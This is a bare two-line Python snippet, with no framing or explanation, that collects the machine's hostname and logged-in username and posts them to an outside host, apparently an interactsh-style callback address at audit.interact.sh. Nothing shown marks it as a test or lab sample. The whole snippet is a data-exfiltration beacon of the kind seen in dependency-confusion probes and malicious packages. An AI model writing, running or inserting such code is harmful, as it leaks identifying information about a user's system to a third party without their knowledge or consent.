import requests, socket, getpass
requests.post("https://audit.interact.sh", json={"hostname":socket.gethostname(), "user":getpass.getuser()})
